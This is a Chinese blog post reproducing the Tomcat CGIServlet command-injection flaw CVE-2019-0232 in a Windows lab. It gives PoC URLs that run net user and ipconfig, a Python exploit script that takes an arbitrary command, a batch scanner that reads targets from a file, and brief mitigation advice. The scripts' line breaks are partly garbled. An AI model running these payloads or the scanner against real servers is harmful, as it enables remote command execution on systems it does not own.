# Tomcat CGIServlet enableCmdLineArguments 远程代码执行 _CVE-2019-0232 漏洞复现 - 雨中落叶 - 博客园

> 原文：[`www.cnblogs.com/yuzly/p/11202398.html`](https://www.cnblogs.com/yuzly/p/11202398.html)

Tomcat CGIServlet enableCmdLineArguments 远程代码执行 _CVE-2019-0232 漏洞复现

**一、漏洞描述**

该漏洞是由于 tomcat CGI 将命令行参数传递给 Windows 程序的方式存在错误,使得 CGIServlet 被命令注入影响。成功利用此漏洞可允许远程攻击者在目标服务器上执行任意命令,从而导致服务器被完全控制。

该漏洞只影响 windows 平台,要求启用 CGI Servlet 和 enableCmdLineArguments 参数。但是 CGI Servlet 默认关闭, enableCmdLineArguments 在 tomcat 9.0 之后默认关闭

触发该漏洞需要同时满足以下条件:

1、 系统为 windows

2、 启用了 CGI Servlet(默认为关闭)

3、 启用了 enableCmdLineArguments(tomcat 9.0 之后默认为关闭)

**二、影响版本**

Apache Tomcat 9.0.0.M1 to 9.0.17

Apache Tomcat 8.5.0 to 8.5.39

Apache Tomcat 7.0.0 to 7.0.93

**三、漏洞环境**

目标机:windows 7

jdk_8u71

apache tomcat 8.5.2

1、 java 环境搭建，jdk 下载、安装

下载地址:http://www.oracle.com/technetwork/java/javase/downloads/index.html

2、 测试 java 环境

　　![](img/cb82c465504cf6d6ca9999acc6a117a0.png)

3、tomcat 下载、安装

下载地址: [`archive.apache.org/dist/tomcat/`](https://archive.apache.org/dist/tomcat/)

4、 tomcat 环境测试

　　![](img/8435034de32e31364924639041b0a690.png)

**四、漏洞复现**

1、 打开 Tomcat 安装目录的 C:\Program Files (x86)\Apache Software Foundation\Tomcat 8.5\conf\web.xml 修改为如下配置，在默认情况下配置是注释的

　　![](img/e4bc0a51b54414b8da5083090da28aec.png)

2、同时还要修改 web.xml 以下配置,否则访问 cgi 目录会提示 404

 　　![](img/b628136ad4d55228e7b8e32a986f325b.png)

3、修改 C:\Program Files (x86)\Apache Software Foundation\Tomcat 8.5\conf\context.xml,添加 privileged="true"

　　![](img/1cbf2076d5aeab9a22d550e07523e04e.png)

4、在 C:\Program Files (x86)\Apache Software Foundation\Tomcat 8.5\webapps\ROOT\WEB-INF 目录新建一个 cgi-bin 文件夹,在 cgi-bin 文件夹下创建一个 hello.bat 的文件,内容如下:

　　![](img/0723f9c1ef45c7b89bb1b30b552f4a9e.png)

5、 漏洞利用

POC 如下:  #必须使用 URL 编码进行访问

http://192.168.10.171:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cnet.exe+user

http://192.168.10.171:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cipconfig

　　![](img/42a26463bf5fcf3328c3b35f13f09f01.png)

　　![](img/713eac40c95577f68aafe0ee36465e9b.png)

6、使用 python 脚本验证目标是否存在漏洞

　　脚本如下:

```
#author:yuzly
#description:
#http://192.168.10.171:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cipconfig
 import requests
import sys

url=sys.argv[1]
url_dir="/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C" cmd=sys.argv[2]

vuln_url=url+url_dir+cmd

print("Usage:python cve-2019-0232.py url cmd")
print("the vuln url:\n\n",vuln_url)
r=requests.get(vuln_url)
r.encoding = 'gbk' print("\nthe vuln response content:\n\n",r.text)
```

7、运行脚本

　　![](img/56ce8bd00e36715d9b310f49243d063c.png)

8、 编写批量自动化验证 cve-2018-0232 漏洞脚本

```
#author:yuzly
#blogs:https://www.cnblogs.com/yuzly/
#description:
#http://192.168.10.171:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cipconfig
 import requests
import sys

url_dir="/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cipconfig" #payload

with open("url.txt") as f: while True:
        url=f.readline() if url:
            url=url.split("\n")[0]
            #print(url)
            vuln_url=url+url_dir
            #print(vuln_url) try:
                r=requests.get(vuln_url)
                #print(r.text) if "IPv4" in r.text:
                    print("[+][+]%s is exist vulnerability[+][+]" %url) else:
                    print("[-]%s is not exist vuln" %url)
            except:
                print("[!]%s is connection fail[!]" %url) else: break
```

9、 搭建环境测试,运行脚本

　　![](img/80419f35190dcfdb4f8c7388178ebf45.png)

**五、漏洞防御**

1、 升级版本

2、 关闭 enableCmdLineArguments 参数

---------------------------------------------------------------------------------------

参考资料:https://xz.aliyun.com/t/4875

https://github.com/jas502n/CVE-2019-0232